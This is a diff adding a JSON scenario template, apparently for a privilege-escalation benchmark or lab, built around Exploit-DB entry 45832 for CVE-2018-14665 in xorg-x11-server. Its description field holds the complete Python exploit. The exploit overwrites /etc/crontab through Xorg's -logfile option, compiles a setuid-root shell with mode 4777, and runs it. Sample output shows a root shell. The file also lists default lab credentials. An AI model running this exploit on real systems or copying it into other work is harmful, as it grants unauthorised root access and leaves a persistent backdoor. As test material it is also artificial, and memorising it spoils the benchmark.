@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_45832",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: xorg-x11-server < 1.20.1 - Local Privilege Escalation (CVE-2018-14665)\n\nExploit source code (45832.py):\n```\n# Exploit Title: xorg-x11-server < 1.20.1 - Local Privilege Escalation (RHEL 7)\n# Date: 2018-11-07\n# Exploit Author: @bolonobolo\n# Vendor Homepage: https://www.x.org/\n# Version: 1.19.5\n# Tested on: RHEL 7.3 && 7.5\n# CVE : CVE-2018-14665\n# Explanation\n# The only condition that have to be met for this PE to work via SSH, is that the legitimate non-root user\n# has to be logged in trought console at the moment the PE script launched.\n# In fact during the logged in session of the legitimate non-root user,\n# a file with the name of the non-root user will be created in the /var/run/console folder.\n# With that file present, the same non-root user can launch a Xorg command via SSH.\n#\n# Usage: $ python poc.py\n# $ python poc.py\n# [*] Waiting for bolo to connect to the console\n# [*] OK --> bolo console opened\n# [*] Building root shell wait 2 minutes\n# [*] crontab overwritten\n#\n# ... cut Xorg output ...\n#\n# [*] Xorg killed\n# (II) Server terminated successfully (0). Closing log file.\n# [*] Don't forget to cleanup /etc/crontab and /tmp dir\n# sh-4.2# id && whoami\n# uid=0(root) gid=0(root) gruppi=0(root),1001(bolo)\n# root\n# sh-4.2#\n\n\n#!/usr/bin/python\nimport os\nimport getpass\nimport subprocess\n\nuserList = []\npath=\"/var/run/console/\"\n\ndef getWhoami():\n\treturn getpass.getuser()\n\ndef getConsole(path):\n\tp = subprocess.Popen([\"ls\", path], stdout=subprocess.PIPE)\n\t(console, err) = p.communicate()\n\tconsoleList = str.splitlines(console)\n\treturn consoleList\n\ndef payload():\n\tf = open(\"/tmp/payload\", \"w\")\n\tpayload = (\"cp /bin/sh /usr/local/bin/shell\\n\"\n\t\t\t\"echo \\\"#include <stdio.h> \\\" > /tmp/shell.c\\n\"\n   \t\t\t\"echo \\\"#include <stdlib.h>\\\" >> /tmp/shell.c\\n\"\n   \t\t\t\"echo \\\"#include <sys/types.h>\\\" >> /tmp/shell.c\\n\"\n   \t\t\t\"echo \\\"#include <unistd.h>\\\" >> /tmp/shell.c\\n\"\n\t\t\t\"echo 'int main(){setuid(0);setgid(0);system(\\\"/bin/sh\\\");}' >> /tmp/shell.c\\n\"\n\t\t\t\"gcc /tmp/shell.c -o /usr/local/bin/shell\\n\"\n\t\t\t\"chmod 4777 /usr/local/bin/shell\\n\")\n\tf.write(payload)\n\ndef executePayload():\n\tos.system(\"chmod +x /tmp/payload\")\n\tos.system(\"cd /etc; Xorg -fp \\\"* * * * * root /tmp/payload\\\" -logfile crontab :1 &\")\n\tprint \"[*] crontab overwritten\"\n\tos.system(\"sleep 5\")\n\tos.system(\"pkill Xorg\")\n\tprint \"[*] Xorg killed\"\n\tos.system(\"sleep 120\")\n\treturn\n\ndef main():\n\twhoami = getWhoami()\n\tprint \"[*] Waiting for \" + whoami + \" to connect to the console\"\n\ti = 0\n\twhile (i == 0):\n\t\tconsoleList = getConsole(path)\n\t\tfor user in consoleList:\n\t\t\tif user == whoami :\n\t\t\t\tprint \"[*] OK --> \" + user + \" console opened\"\n\t\t\t\ti = 1\n\tprint \"[*] Building root shell wait 2 minutes\"\n\tpayload()\n\texecutePayload()\n\tprint \"[*] Don't forget to cleanup /etc/crontab and /tmp dir\"\n\tos.system(\"/usr/local/bin/shell\")\n\nif __name__ == '__main__':\n\tmain()\n```",
+  "cve": "CVE-2018-14665",
+  "exploitdb_id": "45832",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_45832",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
